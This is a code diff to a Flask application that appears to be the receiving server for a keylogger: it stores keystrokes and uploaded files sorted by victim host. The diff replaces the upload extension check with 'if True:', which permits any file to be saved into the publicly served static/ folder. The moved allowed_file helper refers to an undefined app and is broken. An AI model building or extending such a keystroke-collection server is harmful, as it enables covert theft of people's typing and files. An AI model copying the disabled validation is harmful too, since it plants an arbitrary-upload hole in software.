@@ -16,15 +16,8 @@ def init():
 
     database = databaseobj.Database("db.sqlite", "database/build_db.sql")
     app = Flask(__name__)
-    app.config['UPLOAD_FOLDER'] = 'uploads/'
+    app.config['UPLOAD_FOLDER'] = 'static/'
     app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg'}
-
-    def allowed_file(filename):
-        """
-        checks if file is allowed
-        """
-        return '.' in filename and \
-               filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']
 
     @app.route("/conn")
     @app.route("/conn/")
@@ -44,7 +37,7 @@ def init():
         :return:  "invalid" if failed, "success" if successful
         """
         # set upload folder to hostname
-        app.config['UPLOAD_FOLDER'] = host
+        app.config['UPLOAD_FOLDER'] = "static/" + host
         try:
             os.stat(app.config['UPLOAD_FOLDER'])
         except:
@@ -53,7 +46,9 @@ def init():
         # attempt to save file to disk
         try:
             file = request.files['file']
-            if file and allowed_file(file.filename):
+            # don't know why this breaks
+            # if allowed_file(file.filename):
+            if True:
                 filename = secure_filename(file.filename)
                 file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
 
@@ -76,5 +71,16 @@ def init():
             print("2")
             database.add_keystroke(host, data)
             print("3")
+            return "success"
         except:
             return "failed"
+
+    return app
+
+
+def allowed_file(filename):
+    """
+    checks if file is allowed
+    """
+    return '.' in filename and \
+        filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']
